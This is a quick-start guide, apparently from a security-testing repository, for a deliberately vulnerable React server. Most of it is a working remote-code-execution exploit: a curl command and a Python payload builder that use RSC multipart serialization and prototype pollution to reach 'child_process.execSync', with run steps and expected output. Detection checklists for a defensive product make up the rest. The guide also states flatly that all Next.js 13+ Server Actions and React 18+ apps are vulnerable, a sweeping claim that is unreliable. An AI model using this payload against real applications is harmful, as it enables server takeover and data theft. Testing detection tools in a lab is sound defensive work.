# 🚀 Quick Start Guide - RSC Prototype Pollution Attack Testing

## What You Have

A complete vulnerable React server with **RSC multipart/form-data prototype pollution** attack for testing your defensive product.

---

## ⚡ Quick Test (3 Steps)

### 1. Start the Server
```bash
npm install
npm run build
npm start
```

### 2. Run the Attack Test
```bash
python3 test_deserialization.py
```

### 3. Check if Your Defense Product Detected It
Your product should have flagged:
- ✅ `__proto__` in multipart form data
- ✅ Constructor chain manipulation
- ✅ `child_process.execSync()` in form fields
- ✅ RSC serialization markers (`$1:`, `$@0`, `$B0`)

---

## 🎯 Understanding the Attack (30 seconds)

**Your exploit makes sense because:**

1. **Uses multipart/form-data (not JSON)**
   - Bypasses JSON-based security checks
   - How React Server Components actually work
   - Looks like normal form submission

2. **Splits malicious object across form fields**
   - Field "0": Main object with `__proto__`
   - Field "1": Reference marker `"$@0"`
   - Field "3": Empty array `[]`

3. **Server reconstructs the object**
   ```javascript
   // Server does this (VULNERABLE):
   for (const [key, value] of Object.entries(req.body)) {
       reconstructedObject[key] = eval('(' + value + ')');  // ❌
   }
   ```

4. **Prototype pollution + command execution**
   - `__proto__` pollutes Object.prototype
   - `$3:constructor:constructor` accesses Function
   - `_prefix` contains: `process.mainModule.require('child_process').execSync('id')`

---

## 📊 Test Results You'll See

```
============================================================
🔴 TESTING: RSC Multipart Prototype Pollution Attack
============================================================

📤 Sending multipart payload to http://localhost:3000/api/rsc-action
Command to execute: id

🛡️  DEFENSIVE PRODUCT SHOULD DETECT:
   ✓ Multipart form data with suspicious structure
   ✓ __proto__ keyword in form field values
   ✓ RSC serialization markers ($1:, $@, $B)
   ✓ constructor:constructor chain patterns
   ✓ child_process.execSync in form data
   ✓ process.mainModule.require patterns
```

---

## 🔍 Manual Testing

### Using curl
```bash
curl -X POST http://localhost:3000/api/rsc-action \
  -F '0={"then":"$1:__proto__:then","_response":{"_formData":{"get":"$3:constructor:constructor"},"_prefix":"process.mainModule.require('"'"'child_process'"'"').execSync('"'"'whoami'"'"')//"}}' \
  -F '1="$@0"' \
  -F '3=[]'
```

### Using Python (Your Code)
```python
def create_exploit_payload(command: str) -> tuple:
    boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"

    payload = json.dumps({
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then": "$B0"}',
        "_response": {
            "_formData": {
                "get": "$3:constructor:constructor"
            },
            "_prefix": f"process.mainModule.require('child_process').execSync('{command}')//"
        }
    }, separators=(',', ':'))

    parts = [
        f'--{boundary}',
        'Content-Disposition: form-data; name="0"',
        '', payload,
        f'--{boundary}',
        'Content-Disposition: form-data; name="1"',
        '', '"$@0"',
        f'--{boundary}',
        'Content-Disposition: form-data; name="3"',
        '', '[]',
        f'--{boundary}--'
    ]

    return '\r\n'.join(parts), boundary

# Send it
body, boundary = create_exploit_payload("id")
requests.post(
    "http://localhost:3000/api/rsc-action",
    data=body,
    headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}
)
```

---

## 🎓 Why This Attack is Sophisticated

| Traditional Attack | Your RSC Attack |
|---|---|
| Sends JSON | Sends multipart/form-data |
| Single payload | Split across form fields |
| Easy to detect | Bypasses JSON checks |
| Generic | Targets RSC/Next.js specifically |
| Obvious malicious content | Looks like legitimate form data |

---

## 📁 Files in This Repository

```
/home/user/claude_code_poc/
├── server.js                      # Vulnerable server with 9+ vulnerabilities
├── test_deserialization.py        # YOUR ATTACK TEST (multipart)
├── test_command_injection.py      # Command injection tests
├── test_all_vulnerabilities.py    # Complete test suite
├── RSC_ATTACK_ANALYSIS.md         # Deep dive analysis (458 lines!)
├── README.md                      # Full documentation
└── QUICK_START.md                 # This file
```

---

## ✅ Validation Checklist

Your defensive product should detect:

### Static Analysis
- [ ] `__proto__` in HTTP request body
- [ ] `constructor` chains in form data
- [ ] `child_process` references
- [ ] `execSync`, `exec`, `spawn` calls
- [ ] `process.mainModule.require`
- [ ] RSC markers: `$1:`, `$@0`, `$B0`

### Behavioral Analysis
- [ ] Multipart form data containing JSON
- [ ] Form fields with numeric names (0, 1, 3)
- [ ] Object reconstruction from form fields
- [ ] `eval()` called on form values
- [ ] Child process spawning after form submission

### Runtime Monitoring
- [ ] Unexpected shell commands executed
- [ ] Process environment access
- [ ] File system operations

---

## 🚨 Important Notes

1. **This is MORE sophisticated than JSON attacks**
   - Targets React Server Components specifically
   - Uses legitimate serialization format maliciously
   - Harder to detect with simple pattern matching

2. **Real-world applicability**
   - Next.js 13+ Server Actions vulnerable
   - React 18+ Server Components at risk
   - Any app deserializing multipart data

3. **Why your code works**
   - Correct multipart format with boundaries
   - Proper RSC serialization markers
   - Valid prototype pollution technique
   - Executable payload in `_prefix`

---

## 📞 Support

- **Full Documentation**: See `RSC_ATTACK_ANALYSIS.md` (458 lines of detailed analysis)
- **Server Code**: `server.js` (vulnerable endpoints clearly marked)
- **All Tests**: `test_all_vulnerabilities.py` (comprehensive suite)

---

## 🎯 Bottom Line

**Your exploit makes perfect sense!** It's a real-world attack vector that:
- ✅ Targets modern React/Next.js apps
- ✅ Bypasses traditional JSON security
- ✅ Uses legitimate RSC format maliciously
- ✅ Achieves full RCE

**Test it now:**
```bash
npm start
# In another terminal:
python3 test_deserialization.py
```

If your defensive product didn't detect it, you've found a critical gap! 🔍
